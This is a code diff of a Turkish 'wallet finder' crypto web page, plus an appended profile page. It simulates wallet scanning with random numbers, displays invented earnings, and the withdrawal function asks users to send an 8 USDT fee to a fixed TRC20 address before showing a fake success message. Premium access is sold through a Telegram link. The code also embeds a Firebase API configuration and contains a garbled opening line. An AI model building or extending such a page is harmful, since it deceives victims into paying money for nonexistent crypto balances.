@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+ </st<!DOCTYPE html>
 <html lang="tr">
 <head>
 <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-7880815739817256"
@@ -7,6 +7,64 @@
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Kripto Tarama Paneli - Premium Kilit</title>
 <style>
+.profile-container {
+  position: fixed;
+  top: 10%;
+  right: 10%;
+  background: white;
+  border: 1px solid #ccc;
+  padding: 20px;
+  width: 320px;
+  box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+  border-radius: 8px;
+  z-index: 1000;
+}
+
+.profile-container h2, .profile-container h3 {
+  margin-top: 0;
+}
+
+.profile-container ul {
+  max-height: 150px;
+  overflow-y: auto;
+  padding-left: 20px;
+  margin-top: 5px;
+}
+
+.profile-container button {
+  margin-top: 15px;
+  padding: 8px 12px;
+  cursor: pointer;
+}
+
+
+#balanceContainer {
+  position: relative;
+  display: inline-block;
+  font-size: 1.5rem;
+  font-weight: bold;
+  margin-bottom: 15px;
+}
+
+#balanceGain {
+  position: absolute;
+  left: 60px;
+  top: -20px;
+  color: green;
+  font-weight: bold;
+  opacity: 0;
+  transition: opacity 0.5s ease, transform 0.5s ease;
+  transform: translateY(0);
+  pointer-events: none;
+  user-select: none;
+  font-size: 1rem;
+}
+
+#balanceGain.show {
+  opacity: 1;
+  transform: translateY(-20px);
+}
+
   body {
     background: #181a29;
     color: #eee;
@@ -17,9 +75,36 @@
   header {
     margin-bottom: 30px;
   }
-  h1 {
-    color: #a277ff;
+header h1.blinking-title {
+  font-weight: 900;
+  font-size: 3rem;
+  text-transform: uppercase;
+  color: #00bfff;
+  text-shadow:
+    0 0 5px #00bfff,
+    0 0 10px #00bfff,
+    0 0 20px #00bfff,
+    0 0 40px #00bfff,
+    0 0 80px #00bfff;
+  animation: neonBlink 1.8s ease-in-out infinite alternate;
+}
+
+@keyframes neonBlink {
+  0%, 100% {
+    opacity: 1;
+    text-shadow:
+      0 0 5px #00bfff,
+      0 0 10px #00bfff,
+      0 0 20px #00bfff,
+      0 0 40px #00bfff,
+      0 0 80px #00bfff;
   }
+  50% {
+    opacity: 0.5;
+    text-shadow: none;
+  }
+}
+
   button, select, input {
     padding: 10px;
     margin: 8px;
@@ -55,9 +140,9 @@
     display: none;
   }
   input[type=checkbox]:checked + label {
-    background: #a277ff;
+    background: #1abc9c;
     color: white;
-    box-shadow: 0 0 8px #a277ff;
+    box-shadow: 0 0 8px #1abc9c;
   }
   input.locked + label {
     cursor: not-allowed;
@@ -73,7 +158,7 @@
   }
   #scanOutput {
     background: #222;
-    color: #a277ff;
+    color: #1abc9c;
     margin: 15px auto;
     max-width: 600px;
     height: 180px;
@@ -106,28 +191,30 @@
     margin-right: 8px;
   }
   #getPasswordBtn {
-    background: #55aaff;
+    background: #16a085;
+    color: white;
   }
 </style>
+
 </head>
 <body>
 
 <header>
-  <h1>WALLET FİNDER REXFİNANS</h1>
+  <h1 class="blinking-title">WALLET FİNDER REXFİNANS</h1>
 </header>
+
 
 <div id="unlockSection">
   <input type="password" id="passwordInput" placeholder="Premium Şifre Girin" />
   <button id="unlockPremiumBtn">Premium Kilidini Aç</button>
-<button class="premium-button" onclick="window.location.href='ödeme.html'">
-  Premium Paket Satın Al
+  <button class="premium-button" onclick="window.location.href='ödeme.html'">Premium Paket Satın Al</button>
   <button id="getPasswordBtn">Şifre Al</button>
 </div>
 
 <div>
   <select id="speedSelect" disabled>
-    <option value="1" selected>1x (Ücretsiz)</option>
-    <option value="10">10x (Premium)</option>
+    <option value="2" selected>2x (Ücretsiz)</option>
+    <option value="14">10x (Premium)</option>
     <option value="20">20x (Premium)</option>
     <option value="30">30x (Premium)</option>
   </select>
@@ -142,6 +229,9 @@
 
 <pre id="scanOutput"></pre>
 
+<button id="loadHistoryBtn">Tarama Geçmişini Göster</button>
+<div id="historyOutput" style="margin-top:10px;"></div>
+
 <div id="withdrawSection">
   <h2>Para Çekme</h2>
   <input type="text" id="withdrawAddress" placeholder="TRC20 USDT Cüzdan Adresi" />
@@ -153,7 +243,10 @@
 
 <script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-app.js";
-import { getFirestore, doc, getDoc, updateDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore.js";
+import {
+  getFirestore, doc, getDoc, updateDoc, serverTimestamp,
+  collection, setDoc, getDocs, query, where, orderBy
+} from "https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore.js";
 
 const firebaseConfig = {
   apiKey: "AIzaSyBXddctTbfBzgJ9sgtVCvSMtNJRd3JVeHs",
@@ -182,12 +275,19 @@ const speedSelect = document.getElementById('speedSelect');
 const unlockBtn = document.getElementById("unlockPremiumBtn");
 const passwordInput = document.getElementById("passwordInput");
 const getPasswordBtn = document.getElementById("getPasswordBtn");
+const historyBtn = document.getElementById('loadHistoryBtn');
+const historyOutput = document.getElementById('historyOutput');
 
 let scanInterval = null;
 let balance = 0;
 let premiumUnlocked = false;
-
 const freeCoinsCount = 5;
+
+let userId = localStorage.getItem("userId");
+if (!userId) {
+  userId = 'user_' + Math.random().toString(36).substring(2, 10);
+  localStorage.setItem("userId", userId);
+}
 
 function createCoinCheckboxes() {
   coinContainer.innerHTML = '';
@@ -217,12 +317,14 @@ function createCoinCheckboxes() {
 
 createCoinCheckboxes();
 
-// Kullanıcı kimliği belirleme (localStorage)
-let userId = localStorage.getItem("userId");
-if (!userId) {
-  userId = 'user_' + Math.random().toString(36).substring(2, 10);
-  localStorage.setItem("userId", userId);
-}
+(async () => {
+  const ref = doc(db, "balances", userId);
+  const snap = await getDoc(ref);
+  if (snap.exists()) {
+    balance = snap.data().amount;
+    balanceSpan.textContent = balance.toFixed(4);
+  }
+})();
 
 unlockBtn.onclick = async () => {
   const pass = passwordInput.value.trim();
@@ -252,12 +354,12 @@ unlockBtn.onclick = async () => {
     }
 
     premiumUnlocked = true;
-    alert("✅ Premium kilidi açıldı! Artık tüm coinleri seçebilirsiniz.");
+    alert("✅ Premium kilidi açıldı!");
     speedSelect.disabled = false;
     createCoinCheckboxes();
     passwordInput.value = "";
   } catch (err) {
-    alert("Bir hata oluştu: " + err.message);
+    alert("Hata: " + err.message);
   }
 };
 
@@ -265,26 +367,52 @@ getPasswordBtn.onclick = () => {
   window.open("https://t.me/rexfinans", "_blank");
 };
 
+function generateMaskedWallet() {
+  const full = crypto.randomUUID().replace(/-/g, '');
+  return full.substring(0, 12) + '****';
+}
+
 function scanStep() {
   const selectedCoins = Array.from(document.querySelectorAll('input[name="coinSelect"]:checked')).map(c => c.value);
   if (selectedCoins.length === 0) {
     scanOutput.textContent += "\nLütfen en az bir coin seçin.\n";
     return;
   }
+
   const randomCoin = selectedCoins[Math.floor(Math.random() * selectedCoins.length)];
   const found = Math.random() < 0.10;
-  const randomResult = found ? "BULUNDU! \uD83D\uDCB0" : "Bulunamadı.";
-  const time = new Date().toLocaleTimeString();
+  const maskedWallet = generateMaskedWallet();
+  const result = found ? "BULUNDU! 💰" : "bulunamadı";
 
-  const line = `[${time}] ${randomCoin}: ${randomResult}\n`;
+  const line = `+${randomCoin}: Cüzdan: ${maskedWallet} ${result}\n`;
   scanOutput.textContent += line;
   scanOutput.scrollTop = scanOutput.scrollHeight;
 
   if (found) {
-    balance += (Math.random() * 0.015 + 0.005);
+    const earned = Math.random() * 0.015 + 0.005;
+    balance += earned;
     balanceSpan.textContent = balance.toFixed(4);
+
+const gainEl = document.getElementById("balanceGain");
+gainEl.textContent = `+${earned.toFixed(4)}`;
+gainEl.classList.add("show");
+setTimeout(() => {
+  gainEl.classList.remove("show");
+}, 1500);
+
+    // Firestore'a bakiye yaz
+    setDoc(doc(db, "balances", userId), { amount: balance });
+
+    // Firestore'a geçmişe yaz
+    setDoc(doc(db, "scanLogs", `${userId}_${Date.now()}`), {
+      userId,
+      coin: randomCoin,
+      amount: earned,
+      time: new Date().toISOString()
+    });
   }
 }
+
 
 startScanBtn.onclick = () => {
   const speed = parseInt(speedSelect.value);
@@ -319,17 +447,168 @@ withdrawBtn.onclick = () => {
   }
 
   withdrawMessage.style.color = "#ffaa00";
-  withdrawMessage.textContent = "Lütfen para çekmek için aşağıdaki adrese 8 USDT İşlem ücretini yatırın:\nTRC20\nTPHNV2S6d5oFJarPVju2XV2xBkwDbbyjaH";
+  withdrawMessage.textContent = "Lütfen aşağıdaki adrese 8 USDT işlem ücreti gönderin:\nTRC20\nTPHNV2S6d5oFJarPVju2XV2xBkwDbbyjaH";
 
   setTimeout(() => {
     balance -= (amount + 8);
     balanceSpan.textContent = balance.toFixed(4);
     withdrawMessage.style.color = "#55ff55";
-    withdrawMessage.textContent = `Başarıyla ${amount.toFixed(4)} USDT çekildi (8 USDT çekim ücreti kesildi).`;
+    withdrawMessage.textContent = `Başarıyla ${amount.toFixed(4)} USDT çekildi (8 USDT ücret kesildi).`;
     withdrawAmount.value = "";
     withdrawAddress.value = "";
+    setDoc(doc(db, "balances", userId), { amount: balance });
   }, 3000);
+};
+
+historyBtn.onclick = async () => {
+  historyOutput.innerHTML = "⏳ Yükleniyor...";
+  const q = query(collection(db, "scanLogs"), where("userId", "==", userId), orderBy("time", "desc"));
+  const snapshot = await getDocs(q);
+  if (snapshot.empty) {
+    historyOutput.innerHTML = "Henüz tarama geçmişi yok.";
+    return;
+  }
+  let html = "";
+  snapshot.forEach(doc => {
+    const d = doc.data();
+    html += `<div>[${new Date(d.time).toLocaleString()}] ${d.coin}: +${d.amount.toFixed(4)} USDT</div>`;
+  });
+  historyOutput.innerHTML = html;
 };
 </script>
 </body>
 </html>
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8" />
+  <title>Profil ve Çekim Geçmişi</title>
+  <style>
+    /* CSS kodlarını buraya yapıştır */
+    .profile-container {
+      position: fixed;
+      top: 10%;
+      right: 10%;
+      background: white;
+      border: 1px solid #ccc;
+      padding: 20px;
+      width: 320px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      border-radius: 8px;
+      z-index: 1000;
+    }
+    .profile-container h2, .profile-container h3 {
+      margin-top: 0;
+    }
+    .profile-container ul {
+      max-height: 150px;
+      overflow-y: auto;
+      padding-left: 20px;
+      margin-top: 5px;
+    }
+    .profile-container button {
+      margin-top: 15px;
+      padding: 8px 12px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+<!-- HTML içindeki Profil kısmı örneği -->
+<div id="userProfile" class="profile-container" style="display:none;">
+  <h2>Profil Bilgileri</h2>
+  <p><strong>Email:</strong> <span id="profileEmail"></span></p>
+  <p><strong>Kayıt Tarihi:</strong> <span id="profileJoinDate"></span></p>
+
+  <h3>Çekim Geçmişi</h3>
+  <ul id="withdrawalList"></ul>
+
+  <button id="closeProfileBtn">Kapat</button>
+</div>
+
+<button id="profileBtn">Profilim</button>
+
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-app.js";
+  import { getAnalytics } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-analytics.js";
+  import { getFirestore, doc, getDoc, collection, query, where, getDocs } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-firestore.js";
+  import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-auth.js";
+
+  // Firebase config
+  const firebaseConfig = {
+    apiKey: "AIzaSyBXddctTbfBzgJ9sgtVCvSMtNJRd3JVeHs",
+    authDomain: "crypto-eccb4.firebaseapp.com",
+    projectId: "crypto-eccb4",
+    storageBucket: "crypto-eccb4.firebasestorage.app",
+    messagingSenderId: "773649197313",
+    appId: "1:773649197313:web:18da6ed3ee63353c4e9300",
+    measurementId: "G-B8D9V0V9XE"
+  };
+
+  // Firebase başlatma
+  const app = initializeApp(firebaseConfig);
+  const analytics = getAnalytics(app);
+  const db = getFirestore(app);
+  const auth = getAuth(app);
+
+  let currentUserId = null;
+
+  // Kullanıcı oturumunu dinle
+  onAuthStateChanged(auth, user => {
+    if (user) {
+      currentUserId = user.uid;
+      console.log("Giriş yapan kullanıcı:", currentUserId);
+    } else {
+      currentUserId = null;
+      console.log("Kullanıcı çıkış yaptı");
+    }
+  });
+
+  // Profil yükleme fonksiyonu
+  async function loadUserProfile(userId) {
+    try {
+      const userDoc = await getDoc(doc(db, "users", userId));
+      if (!userDoc.exists()) {
+        alert("Kullanıcı bilgisi bulunamadı.");
+        return;
+      }
+      const userData = userDoc.data();
+
+      const withdrawalsQuery = query(collection(db, "withdrawals"), where("userId", "==", userId));
+      const withdrawalsSnapshot = await getDocs(withdrawalsQuery);
+
+      document.getElementById("profileEmail").textContent = userData.email || "Bilinmiyor";
+      document.getElementById("profileJoinDate").textContent = userData.registerDate || "Bilinmiyor";
+
+      const withdrawalList = document.getElementById("withdrawalList");
+      withdrawalList.innerHTML = "";
+
+      withdrawalsSnapshot.forEach(docSnap => {
+        const w = docSnap.data();
+        const item = document.createElement("li");
+        const dateStr = new Date(w.time).toLocaleString();
+        item.textContent = `${w.amount.toFixed(4)} USDT - ${dateStr}`;
+        withdrawalList.appendChild(item);
+      });
+
+      document.getElementById("userProfile").style.display = "block";
+    } catch (error) {
+      console.error("Profil yükleme hatası:", error);
+      alert("Profil yüklenirken hata oluştu.");
+    }
+  }
+
+  // Profil butonu tıklaması
+  document.getElementById("profileBtn").addEventListener("click", () => {
+    if (!currentUserId) {
+      alert("Lütfen giriş yapınız.");
+      return;
+    }
+    loadUserProfile(currentUserId);
+  });
+
+  // Profil kapatma butonu
+  document.getElementById("closeProfileBtn").addEventListener("click", () => {
+    document.getElementById("userProfile").style.display = "none";
+  });
+</script>
